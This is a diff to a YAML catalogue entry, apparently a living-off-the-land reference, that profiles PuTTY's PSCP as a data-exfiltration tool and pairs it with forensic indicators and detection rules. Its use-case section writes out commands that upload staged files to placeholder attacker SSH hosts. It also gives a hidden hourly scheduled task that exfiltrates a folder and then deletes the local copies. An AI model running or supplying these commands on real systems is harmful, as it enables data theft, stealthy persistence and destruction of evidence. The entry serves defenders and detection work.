@@ -6,27 +6,23 @@ Description: |
   reuse PSCP to exfiltrate data to attacker-controlled SSH servers. PSCP's ubiquity, lack
   of installation requirement, and straightforward command-line usage make it attractive
   for stealthy, scriptable exfiltration workflows.
-
 Category: third-party
 Platform:
   - Windows
   - Linux
 Execution:
   - cli
-
 Capabilities:
   - secure-file-transfer      # encrypted transfer using SSH/SCP
   - non-interactive-usage     # supports key-based auth and scripted invocation
   - recursive-transfer       # recursive copy of directories (e.g., -r)
   - custom-port              # ability to use non-standard SSH ports
   - quiet-mode               # suppress verbose output for stealth
-
 Stealth:
   - portable-executable      # single-file binary runnable from any path
   - key-based-authentication # avoid interactive password prompts
   - non-standard-port        # use of non-22 ports to evade simple filters
   - run-from-user-paths      # execution from %TEMP% or %APPDATA% to blend in
-
 Forensics:
   BinaryLocations:
     - 'C:\Program Files\PuTTY\pscp.exe'
@@ -66,39 +62,32 @@ Forensics:
     - 'Outbound SSH sessions to uncommon IPs or ports (tcp/22 or custom port)'
     - 'One-off or short-lived SSH connections immediately following archive creation'
     - 'High bytes_out associated with scp sessions'
-
 ThreatActors:
   - alphv            # BlackCat/ALPHV
   - lockbit
   - conti
   - generic-ransomware
-
 References:
   - 'https://www.trendmicro.com/en_us/research/23/f/malvertising-used-as-entry-vector-for-blackcat-actors-also-lever.html'
   - 'https://www.microsoft.com/en-us/security/blog/2022/10/18/defenders-beware-a-case-for-post-ransomware-investigations/'
   - 'https://the.earth.li/~sgtatham/putty/latest/htmldoc/Chapter5.html'  # PuTTY / PSCP docs
-
 UseCases:
   - Title: Simple file upload to attacker SSH server
     Description: Upload a single file to a remote SSH server using username@host:path.
     Command: |
       pscp.exe C:\Staged\secret.zip attacker@1.2.3.4:/home/attacker/exfil/secret.zip
-
   - Title: Recursive directory upload
     Description: Recursively copy an entire folder to a remote host (useful for bulk exfiltration).
     Command: |
       pscp.exe -r C:\Staged\Data attacker@1.2.3.4:/home/attacker/exfil/data
-
   - Title: Non-standard port and key-based auth (scripted)
     Description: Use a private key and a custom SSH port to avoid standard-port detection.
     Command: |
       pscp.exe -i C:\Users\Public\id_rsa -P 2222 C:\Staged\*.zip attacker@sshhost.example:/incoming/
-
   - Title: Silent execution via PowerShell scheduled task
     Description: Task executes PSCP to transfer files, then optionally cleans up local artifacts.
     Command: |
       schtasks /Create /SC HOURLY /TN "SystemMaintenance" /TR "powershell -WindowStyle Hidden -Command 'Start-Process -FilePath C:\Temp\pscp.exe -ArgumentList ''-r C:\Staged attacker@1.2.3.4:/exfil'' -NoNewWindow -Wait; Remove-Item C:\Staged\* -Force'"
-
 Detection:
   - Type: Process/Path Anomaly
     Description: Alert on pscp.exe (or suspiciously named pscp-like binaries) executed from non-standard locations (e.g., %TEMP%, %APPDATA%, user Desktop) or when the binary name is unusual for the host.
@@ -112,12 +101,10 @@ Detection:
     Description: Alert when pscp-related process exhibits large bytes_out shortly after file-collection/archival activity (.zip/.7z creation).
   - Type: Persistence & Hygiene
     Description: Detect creation of scheduled tasks or Run keys that reference pscp or scripts invoking pscp, and file cleanup immediately after successful transfers.
-
 Tags:
   - stealth
   - third-party
   - cli
   - secure-transfer
   - commonly-used
-
 LastModified: '2025-11-17'
